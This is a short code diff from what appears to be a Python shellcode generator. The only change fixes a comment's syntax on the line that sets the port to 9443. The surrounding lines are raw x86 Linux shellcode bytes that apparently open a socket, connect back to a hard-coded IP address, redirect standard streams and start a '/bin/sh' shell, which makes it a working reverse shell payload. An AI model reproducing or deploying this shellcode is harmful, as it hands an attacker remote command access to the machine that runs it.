@@ -32,7 +32,7 @@ def generate(port=port_default):
                  "\x31\xc0\x66\xb8\x6a\x01\x68"
                  "\x0a\xbc\xf2\xfe"
                  "\x66\x68"
-                 "\x24\xe3" // ==> port number = 9443; sock_ad.sin_port = htons(9443);
+                 "\x24\xe3" # ==> port number = 9443; sock_ad.sin_port = htons(9443);
                  "\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31"
                  "\xc9\xb1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79"
                  "\xf8\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73"
